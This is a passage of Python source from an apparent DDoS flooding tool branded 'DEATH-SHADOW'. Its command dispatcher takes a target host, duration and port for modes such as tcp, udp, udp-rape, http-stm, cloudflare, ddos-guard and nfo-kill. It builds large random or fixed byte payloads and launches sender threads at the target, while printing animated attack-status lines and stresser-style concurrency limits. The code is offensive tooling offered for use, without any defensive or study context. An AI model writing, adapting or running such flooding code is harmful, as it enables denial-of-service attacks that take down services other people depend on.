						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
						time.sleep(1)
						os.system('cls')
						print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
						time.sleep(1)
						os.system('cls')
						print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
						time.sleep(3)
						os.system('cls')
						print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 655502
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 655502
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 655502
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-xv":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 66890
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 88291
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-rape":
			try:
				if running >= 2000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-rapev2":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 88345
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-bypass":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-stresser":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-stm":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, url, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 65500
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(url, host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-cld":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, url, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 65500
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(url, host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ddos-guard":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, url, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 65500
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(url, host, timer, port, lunch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packet to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packet to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packet to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packet to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packet to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packet to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packet to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "cloudflare":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, url, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 65500
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(url, host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-rapev3":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 995500
					lunch = random._urandom(int(bpass))
					threading.Thread(target=randsender, args=(host, timer, port, lunch)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-drop":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[94m[DEATH-SHADOW] Attack is Continuing Wait a Few Minutes")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo-kill":
			try:
				if running >= 20000:
					print("\033[94mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					bpass = 666225
					lunch = random._urandom(int(bpass))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, lunch, bots, payload)).start()
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\033[93m[-] has sent packet to the server using a \033[92mTransformer X Bumblebee....")
					time.sleep(1)
